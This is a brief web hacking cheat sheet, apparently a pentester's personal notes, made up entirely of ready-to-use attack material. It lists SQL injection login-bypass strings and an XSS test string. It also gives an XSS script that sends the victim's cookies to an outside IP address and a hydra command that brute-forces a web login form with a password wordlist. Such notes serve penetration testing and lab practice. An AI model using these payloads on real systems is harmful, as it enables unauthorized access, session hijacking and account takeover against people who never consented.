# Web Hacking Cheatsheet

## Bypass Authentication with SQL Injection
  `' or 1=1 --`

  `a' or 1=1 --`

  `" or 1=1 --`
  
  `a" or 1=1 --`	      
  
  `' or 1=1 #`

  `" or 1=1 #`

  `or 1=1 --`

  `' or 'x'='x`

  `" or "x"="x`

  `') or ('x'='x`	      
  
  `") or ("x"="x`

## Test for XSS
`Hello!<script>alert("Welcome");</script>`

## XSS Cookie Hijacking
_Start XSS-cookie-stealer.py ***https://raw.githubusercontent.com/lnxg33k/misc/master/XSS-cookie-stealer.py_

_**https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md_

```
<script>
alert(document.cookie);
var i=new Image;
i.src="http://172.30.10.210:8888/?"+document.cookie;
</script>
```

## Brute Force Web Login
`hydra -L /home/n0m4d1k/usernames -P /usr/share/wordlists/rockyou.txt -t 16 172.30.73.80 http-post-form "/login.php:username=^USER^&password=^PASS^&action=Login:Incorrect username or password"`